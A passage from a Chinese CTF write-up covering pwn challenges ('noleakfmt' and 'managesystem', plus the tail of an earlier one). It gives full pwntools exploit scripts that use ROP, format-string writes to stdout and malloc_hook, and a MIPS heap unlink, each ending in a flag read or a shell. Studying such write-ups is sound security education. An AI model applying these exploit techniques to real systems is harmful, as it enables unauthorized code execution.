    edit(5,"\x11"*0x98+p64(pop_rax)+p64(0x480+heap_base)+p64(pop_rax)) # esp
    edit(3,"./flag\x00") # 0x0000555555758590
    payload = flat([2,pop_rdi,heap_base+0x590,pop_rsi,0,syscall,
                    pop_rax,0,pop_rdi,4,pop_rsi,heap_base+0x5a0,pop_rdx,0x20,syscall,
                    pop_rax,1,pop_rdi,1,pop_rsi,heap_base+0x5a0,pop_rdx,0x20,syscall
    ])
    edit(2,payload)
    gdb.attach(p)
    delete(5)
    p.interactive()
## 0x04 noleakfmt
###  查看文件
###  IDA分析
这里有个格式化字符串的漏洞，同时可以无限循环，注意关闭了输出缓冲区。
第一眼看着很像unprintableV，但是注意到格式化字符串是输入到bss上，同时关了stdout，但是这里没有stderr所以不能直接改bss中stdout为stderr，所以只能操作stdout结构体了。
###  思路
看到stdout结构体的地址在当前printf栈地址的上面，这里第一步改双链位置上的stack值到程序地址的地方，我们第一步改printf返回地址为start抬高栈地址。后面就可以改stdout的file结构体的fileno为2就可以成功输出了。
在抬高栈顶的时候选择改printf返回地址为start主要是由于在__libc_start_main中有这么一条指令就足以抬高到我们需要的地方。
后面我们则是通过bss上格式化字符串去改掉malloc_hook为one_gadget，最后通过输入大量字符串触发malloc执行one_gadget
###  exp
    #coding=utf-8
    from pwn import *
    context.update(arch="amd64",os="linux",log_level="debug")
    context.terminal = ['tmux', 'split', '-h']
    debug = 1
    p = process("./noleakfmt")
    elf = ELF("./noleakfmt")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
    start_addr = 0x7b0
    malloc_hook_low = 0x10
    # 0x45216 execve("/bin/sh", rsp+0x30, environ)
    # constraints:
    #   rax == NULL
    # 0x4526a execve("/bin/sh", rsp+0x30, environ)
    # constraints:
    #   [rsp+0x30] == NULL
    # 0xf02a4 execve("/bin/sh", rsp+0x50, environ)
    # constraints:
    #   [rsp+0x50] == NULL
    # 0xf1147 execve("/bin/sh", rsp+0x70, environ)
    # constraints:
    #   [rsp+0x70] == NULL
    one_gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
    def exp():
        p.recvuntil("gift : 0x")
        stack_addr = int(p.recv(12),16)
        success("stack address ==> "+hex(stack_addr))
        stack_addr_low = u16(p64(stack_addr)[:2])
        success("stack address low 2 bytes ==> "+hex(stack_addr_low))
        if stack_addr_low > 0x2000 or stack_addr_low fileno
        p.sendline(payload)
        sleep(0.5)
        payload = "%{}c%26$hhn".format(str(0x2))   # modify fileno 0 to 2
        p.sendline(payload)
        sleep(0.5)
        payload = "%9$phhh"
        p.sendline(payload)
        p.recvuntil("0x")
        data = int(p.recv(12),16)
        libc.address = data-240-libc.sym["__libc_start_main"]
        success("libc address ==> "+hex(libc.address))
        malloc_hook_addr = libc.sym['__malloc_hook']
        payload = "%{}c%10$hn--".format(str(stack_addr_low-0x5c))
        p.sendline(payload)
        p.recvuntil("--")
        payload = "%{}c%36$hn--".format(str(malloc_hook_addr & 0xffff))
        p.sendline(payload)
        p.recvuntil("--")
        payload = "%{}c%10$hn--".format(str(stack_addr_low-0x5c+0x2))
        p.sendline(payload)
        p.recvuntil("--")
        payload = "%{}c%36$hn--".format(str((malloc_hook_addr>>16)&0xffff))
        p.sendline(payload)
        p.recvuntil("--")
        payload = "%{}c%10$hn--".format(str(stack_addr_low-0x5c+4))
        p.sendline(payload)
        p.recvuntil("--")
        payload = "%{}c%36$hn--".format(str((malloc_hook_addr>>32)&0xffff))
        p.sendline(payload)
        p.recvuntil("--")
        one_gadget = one_gadgets[3]+libc.address
        payload = "%{}c%10$hn--".format(str(stack_addr_low-0x5c))
        p.sendline(payload)
        p.recvuntil("--")
        payload = "%{}c%25$hn--".format(str(one_gadget & 0xffff))
        p.sendline(payload)
        p.recvuntil("--")
        payload = "%{}c%36$hn--".format(str(malloc_hook_low+0x2))
        p.sendline(payload)
        p.recvuntil("--")
        payload = "%{}c%25$hn--".format(str((one_gadget>>16)&0xffff))
        p.sendline(payload)
        p.recvuntil("--")
        payload = "%{}c%36$hn--".format(str(stack_addr_low+4))
        p.sendline(payload)
        p.recvuntil("--")
        payload = "%{}c%36$hn--".format(str((one_gadget>>32)&0xffff))
        p.sendline(payload)
        p.recvuntil("--")
        p.sendline("%999999c%10$n")
        p.sendline("cat flag 1>&2")
    while True:
        try:
            exp()
            p.interactive()
            p.close()
        except:
            p.close()
        if debug:
            p = process("./noleakfmt")
            elf = ELF("./noleakfmt")
            libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
## 0x05 managesystem
###  程序分析
保护全关，32位的mips题目
###  Ghidra分析程序
Ghidra软件介绍和安装教程[在这](https://www.secrss.com/articles/8829)
用来反编译mips比较方便。
这是一个传统的菜单堆题，分别有create、show、modify、delete四个功能。
modify的位置有溢出8个字节的漏洞，那么我们很容易就想到利用unlink进行攻击，劫持note_list。
###  思路
在当前chunk中伪造一个0x20的堆块，同时溢出编辑下一个chunk的pre_size和pre_inuse位，这样删除下一个chunk的时候会进行向上合并，触发unlink，最后可以达到劫持note_list的目标。
写入got表，先打印出libc地址，再劫持free函数为system，delete一个带有“/bin/sh”字符串的chunk即可getshell
###  exp
    #coding=utf-8
    from pwn import *
    r = lambda p:p.recv()
    rl = lambda p:p.recvline()
    ru = lambda p,x:p.recvuntil(x)
    rn = lambda p,x:p.recvn(x)
    rud = lambda p,x:p.recvuntil(x,drop=True)
    s = lambda p,x:p.send(x)
    sl = lambda p,x:p.sendline(x)
    sla = lambda p,x,y:p.sendlineafter(x,y)
    sa = lambda p,x,y:p.sendafter(x,y)
    context.update(arch='arm',os='linux',log_level='DEBUG')
    context.terminal = ['tmux','split','-h']
    elf = ELF("./pwn3")
    libc = ELF("./lib/libc.so.0")
    global p
    remote_gdb=0
    def get_sh(other_libc = null):
        global libc
        if args['REMOTE']:
            if other_libc is not null:
                libc = ELF("./", checksec = False)
            return remote(sys.argv[1], sys.argv[2])
        elif remote_gdb:
            p = process(["qemu-mipsel-static", "-g", "1234", "-L", "/home/shinnosuke/Desktop/pwn-mips/managesystem", "./pwn3"])
            log.info('Please use GDB remote!(Enter to continue)')
            return p
        else :
            p = process(["qemu-mipsel-static", "-L", "/home/shinnosuke/Desktop/pwn-mips/managesystem", "./pwn3"])
            log.info('Please use GDB remote!(Enter to continue)')
            return p
    def create(sz,info='a'):
        p.sendlineafter("options >>",str(1))
        p.sendlineafter("Enter the user info's length:",str(sz))
        if sz != 0:
            p.sendafter("Enter user's info:",info)
    def delete(idx):
        p.sendlineafter("options >>",str(2))
        p.sendlineafter("Enter the index of user:",str(idx))
    def edit(idx,info):
        p.sendlineafter("options >>",str(3))
        p.sendlineafter("Enter the index of user you want edit:",str(idx))
        p.sendafter("The new user's info:",info)
    def show(idx):
        p.sendlineafter("options >>",str(4))
        p.sendlineafter("Enter the index of user you want show: \n",str(idx))
    p = get_sh()
    note_list = 0x411830
    create(0x20)
    create(0x20-8)
    payload = p32(0)+p32(0x21)+p32(note_list-0xc)+p32(note_list-0x8)+"a"*0x10+p32(0x20)+p32(0x20)
    edit(0,payload)
    delete(1)
    payload = p32(0)*2+p32(0x411830)+p32(0x50)+p32(elf.got['read'])+p32(0x4)
    edit(0,payload)
    show(1)
    p.recvuntil("info: ")
    data = u32(p.recv(4))
    print hex(data)
    libc.address = data - libc.sym['read']
    success("libc address ==> "+hex(libc.address))
    payload = p32(0x411830)+p32(0)+p32(elf.got['free'])+p32(0x10)+p32(libc.search("/bin/sh").next())
    edit(0,payload)
    edit(1,p32(libc.sym['system']))
    delete(2)
    p.interactive()
参考：
天枢西湖论剑WP
[2020-西湖论剑线上部分PWN-WriteUp](https://www.lyyl.online/2020/10/08/2020-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E7%BA%BF%E4%B8%8A%E9%83%A8%E5%88%86PWN-WriteUp/)